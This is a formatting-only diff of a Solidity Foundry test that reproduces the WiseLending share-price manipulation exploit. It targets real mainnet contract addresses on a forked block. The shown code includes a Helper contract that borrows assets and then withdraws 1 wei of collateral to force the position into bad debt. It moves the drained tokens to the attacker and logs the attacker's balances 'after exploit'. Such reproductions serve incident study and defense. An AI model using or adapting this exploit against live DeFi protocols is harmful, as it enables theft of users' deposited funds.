@@ -17,6 +17,7 @@ import "./../interface.sol";
 // Twitter : https://twitter.com/danielvf/status/1746303616778981402
 
 interface IWiseLending {
+
     function depositExactAmount(uint256 _nftId, address _poolToken, uint256 _amount) external returns (uint256);
 
     function withdrawExactShares(uint256 _nftId, address _poolToken, uint256 _shares) external returns (uint256);
@@ -39,21 +40,27 @@ interface IWiseLending {
         returns (uint256 pseudoTotalPool, uint256 totalDepositShares, uint256 collateralFactor);
 
     function borrowExactAmount(uint256 _nftId, address _poolToken, uint256 _amount) external returns (uint256);
+
 }
 
 interface IPool is IERC20 {
+
     function depositExactAmount(uint256 _underlyingLpAssetAmount) external returns (uint256, uint256);
 
     function withdrawExactShares(uint256 _shares) external returns (uint256);
 
     function getPositionLendingShares(uint256, address) external returns (uint256);
+
 }
 
 interface PositionManager is IERC721 {
+
     function mintPosition() external returns (uint256);
+
 }
 
 contract WiseLending is Test {
+
     uint256 blocknumToForkFrom = 18_992_907;
     IERC20 PendleLPT = IERC20(0xC374f7eC85F8C7DE3207a10bB1978bA104bdA3B2);
     IPool LPTPoolToken = IPool(0xB40b073d7E47986D3A45Ca7Fd30772C25A2AD57f); // underlyingToken
@@ -152,15 +159,19 @@ contract WiseLending is Test {
 
         LPTPoolToken.withdrawExactShares(LPTPoolToken.balanceOf(address(this)));
 
-        emit log_named_decimal_uint("\n Attacker PendleLPT Balance After exploit", PendleLPT.balanceOf(address(this)), 18);
+        emit log_named_decimal_uint(
+            "\n Attacker PendleLPT Balance After exploit", PendleLPT.balanceOf(address(this)), 18
+        );
 
         emit log_named_decimal_uint("Attacker WETH Balance After exploit", WETH.balanceOf(address(this)), 18);
 
         emit log_named_decimal_uint("Attacker wstETH Balance After exploit", wstETH.balanceOf(address(this)), 18);
     }
+
 }
 
 contract Helper {
+
     IERC20 PendleLPT = IERC20(0xC374f7eC85F8C7DE3207a10bB1978bA104bdA3B2);
     IPool LPTPoolToken = IPool(0xB40b073d7E47986D3A45Ca7Fd30772C25A2AD57f); // underlyingToken
     IWiseLending wiseLending = IWiseLending(payable(0x37e49bf3749513A02FA535F0CbC383796E8107E4));
@@ -175,7 +186,7 @@ contract Helper {
         wiseLending.borrowExactAmount(positionId, address(asset), debtAmount); // borrow asset
 
         // withdraw 1 wei collateral, burn 1 share, donate (sharePrice - 1) wei collateral to the pool, forced position entered into bad debt
-        wiseLending.withdrawExactAmount(positionId, address(LPTPoolToken), 1); 
+        wiseLending.withdrawExactAmount(positionId, address(LPTPoolToken), 1);
 
         asset.transfer(msg.sender, asset.balanceOf(address(this)));
         LPTPoolToken.transfer(msg.sender, LPTPoolToken.balanceOf(address(this)));
@@ -184,4 +195,5 @@ contract Helper {
     function onERC721Received(address, address, uint256, bytes memory) external returns (bytes4) {
         return this.onERC721Received.selector;
     }
+
 }
